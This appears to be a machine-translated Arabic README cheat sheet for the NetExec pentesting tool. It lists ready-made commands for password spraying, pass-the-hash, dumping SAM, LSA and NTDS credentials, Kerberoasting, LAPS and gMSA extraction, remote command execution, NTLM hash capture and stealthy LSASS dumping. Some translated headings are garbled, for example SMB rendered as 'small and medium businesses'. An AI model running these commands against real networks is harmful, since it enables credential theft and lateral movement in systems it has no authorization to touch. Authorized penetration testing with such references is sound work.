<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Successor">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
</ص>

<p align="center">
  <b>🌐 الوريث الرسمي الذي يقوده المجتمع لـ CrackMapExec لاستغلال الشبكة والدليل النشط</b>
</ص>

---

## 📋 جدول المحتويات

- [المقدمة](#-المقدمة)
- [لماذا NetExec على CrackMapExec؟](#-why-netexec-over-crackmapexec)
- [التثبيت](#-التثبيت)
- [البروتوكولات المدعومة](#-البروتوكولات المدعومة)
- [استغلال الشركات الصغيرة والمتوسطة](#-استغلال الشركات الصغيرة والمتوسطة)
  - [الاستطلاع وتعداد المشاركة](#الاستطلاع--تعداد المشاركة)
  - [رش كلمة المرور واختبار بيانات الاعتماد](#رش كلمة المرور--اختبار بيانات الاعتماد)
  - [تمرير التجزئة (PtH) وتمرير التذكرة (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [إلقاء بيانات الاعتماد (SAM، LSA، NTDS)](#credential-dumping-sam-lsa-ntds)
  - [تنفيذ الأمر](#command-execution)
- [استغلال LDAP](#-استغلال-ldap)
  - [تعداد المجال وسياسة كلمة المرور](#domain-enumeration--password-policy)
  - [AS-REP التحميص والتحميص](#as-rep-roasting-kerberoasting)
  - [استخراج LAPS وgMSA](#laps--gmsa-extraction)
  - [إدخال بيانات Bloodhound](#bloodhound-data-ingestion)
- [استغلال MSSQL](#-mssql-exploitation)
- [وحدات WinRM وRDP وSSH](#-winrm-rdp--ssh-modules)
- [وحدات NetExec الشائعة (`-M`)](#-وحدات-netexec--m) الشائعة
- [مساحات العمل وقاعدة البيانات المضمنة](#-مساحات العمل--قاعدة البيانات المضمنة)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [النصائح وأفضل الممارسات](#-نصائح--أفضل-الممارسات)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 المقدمة

**NetExec** (`nxc`) هي أداة متعددة الأغراض لمرحلة ما بعد الاستغلال مصممة لأتمتة تقييم شبكات Active Directory وWindows الكبيرة. إنه شوكة المجتمع الرسمية النشطة واستمرار **CrackMapExec** (CME)، الذي تم إنشاؤه بعد تقاعد CME وأرشفته بواسطة مؤلفه الأصلي.

تعمل NetExec كشبكة "Swiss Army Knife"، حيث تتفاعل بسلاسة مع SMB وLDAP وMSSQL وWinRM وRDP وSSH وFTP وVNC لأتمتة المصادقة وتفريغ بيانات الاعتماد والتحقق من الثغرات الأمنية والحركة الجانبية.

---

## ⚖️ لماذا NetExec على CrackMapExec؟

| ميزة | كراك ماب إكسيك (CME) | نتيكسيك (نإكسك) |
|---------|--------------------|--------------|
| **حالة التطوير** | 🛑 مؤرشف / مهمل | 🟢 تمت صيانتها بشكل فعال |
| ** دعم بايثون ** | الإرث (بايثون 3.8-3.10) | بايثون الحديثة 3.10+ |
| **دعم البروتوكول** | SMB، LDAP، MSSQL، WinRM، SSH | + تحسينات VNC، FTP، RDP، WMI |
| ** دعم BloodHound ** | تراث BloodHound فقط | بلودهاوند CE والإرث |
| **كيربيروس وبكينيت** | محدودة | دعم قوي لتذاكر PKINIT وKerberos |
| **إصلاحات الأخطاء والوحدات** | مجمدة | يتم تحديث وحدات CVE واستغلالها باستمرار |

---

## 📥 التثبيت

### استخدام pipx (مستحسن)
```bash
pipx install netexec
```
### كالي لينكس

NetExec هو البديل الرسمي لـ CrackMapExec في كالي:
```bash
sudo apt update && sudo apt install -y netexec
```
### عامل الميناء
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### تَحَقّق
```bash
nxc --version
```
---

## 🔌 البروتوكولات المدعومة

يقبل NetExec البروتوكول الهدف كوسيطة أساسية له:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - كتلة رسائل الخادم (المشاركات، تفريغ SAM/LSA/NTDS، أمر exec)
- `nxc ldap` - بروتوكول الوصول إلى الدليل خفيف الوزن (Kerberoasting، BloodHound، LAPS)
- `nxc mssql` - Microsoft SQL Server (استعلامات قاعدة البيانات، xp_cmdshell، انتحال الهوية)
- `nxc winrm` - إدارة Windows عن بعد (تنفيذ الأوامر بشكل خفي)
- `nxc rdp` - بروتوكول سطح المكتب البعيد (التحقق من المصادقة، لقطات الشاشة)
- `nxc ssh` - Secure Shell (اختبار بيانات اعتماد Linux/UNIX والتنفيذ)
- `nxc ftp` / `nxc vnc` - نقل الملفات وحوسبة الشبكة الافتراضية

---

## 🛡️ استغلال الشركات الصغيرة والمتوسطة

### استطلاع وتعداد المشاركة
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### رش كلمة المرور واختبار بيانات الاعتماد
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### تمرير التجزئة (PtH) وتمرير التذكرة (PTT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### تفريغ بيانات الاعتماد (SAM، LSA، NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### تنفيذ الأمر
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 استغلال LDAP

### سياسة تعداد النطاق وكلمة المرور
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### تحميص وتحميص AS-REP
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### استخراج LAPS وgMSA
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### استيعاب بيانات BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ استغلال MSSQL
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 وحدات WinRM وRDP وSSH

### تنفيذ أمر WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### لقطة شاشة RDP والمصادقة
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### رش وأوامر SSH
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 وحدات NetExec الشائعة (`-M`)

| الوحدة | البروتوكول | الوصف | مثال |
|--------|----------------|---------|---------|
| `spooler` | الشركات الصغيرة والمتوسطة | تحقق مما إذا كانت خدمة Print Spooler قيد التشغيل (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | الشركات الصغيرة والمتوسطة | التحقق من وجود ثغرة أمنية CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | الشركات الصغيرة والمتوسطة | التحقق من وجود CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | الشركات الصغيرة والمتوسطة | تحقق مما إذا كان المضيف عرضة لإكراه PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | الشركات الصغيرة والمتوسطة | تفريغ ذاكرة LSASS minidump خلسة باستخدام nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | الشركات الصغيرة والمتوسطة | تحقق مما إذا كانت خدمة WebClient نشطة لترحيل WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | لداب | تفريغ كلمات مرور LAPS لمحطات العمل | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | لداب | استخراج أسرار حساب الخدمة المدارة للمجموعة | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 مساحات العمل وقاعدة البيانات المدمجة

يقوم NetExec تلقائيًا بتسجيل جميع المضيفين المكتشفين وبيانات الاعتماد الصالحة والتجزئات التي تم تفريغها في قاعدة بيانات SQLite محلية (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 جدول مرجعي سريع

| مهمة | البروتوكول | الأمر |
|------|----------|---------|
| **عد المشاركات** | الشركات الصغيرة والمتوسطة | `nxc smb <IP> -u '' -p '' --shares` |
| **التحقق من سياسة المرور** | الشركات الصغيرة والمتوسطة | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **رذاذ كلمة المرور** | الشركات الصغيرة والمتوسطة | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **مرر التجزئة** | الشركات الصغيرة والمتوسطة | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| ** تفريغ سام ** | الشركات الصغيرة والمتوسطة | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **تفريغ NTDS** | الشركات الصغيرة والمتوسطة | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| ** تحميص AS-REP ** | لداب | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **تحميص الكيربوست** | لداب | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **مكب بلودهاوند** | لداب | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 النصائح وأفضل الممارسات

1. **تحقق دائمًا من سياسة كلمة المرور أولاً:**
   قبل إطلاق أي رش لكلمة المرور، قم دائمًا بتشغيل `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` لفحص `Account Lockout Threshold`. إذا تم ضبطه على 3 أو 5، فقم بالرش مرة واحدة فقط كل أكثر من 30 دقيقة لتجنب قفل حسابات النطاق.
2. **استخدم `--local-auth` لمحطات العمل:**
   عند اختبار بيانات اعتماد المسؤول المحلي عبر محطات العمل بدلاً من بيانات اعتماد المجال، قم دائمًا بتضمين علامة `--local-auth`.
3. **التكامل المحوري:**
   يعمل NetExec بسلاسة عبر بروكسيات SOCKS (مثل `proxychains nxc smb ...`) أو عبر واجهات Ligolo-ng TUN بالسرعة الأصلية!

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** NetExec عبارة عن أداة لتقييم الأمان الهجومي. ويجب استخدامه بشكل صارم على شبكات الكمبيوتر والبنية التحتية للمجال حيث حصلت على ترخيص صريح وموثق.

---

## 📚 المصادر

- [مستودع NetExec الرسمي لـ GitHub](https://github.com/Pennyw0rth/NetExec)
- [وثائق NetExec الرسمية](https://www.netexec.wiki/)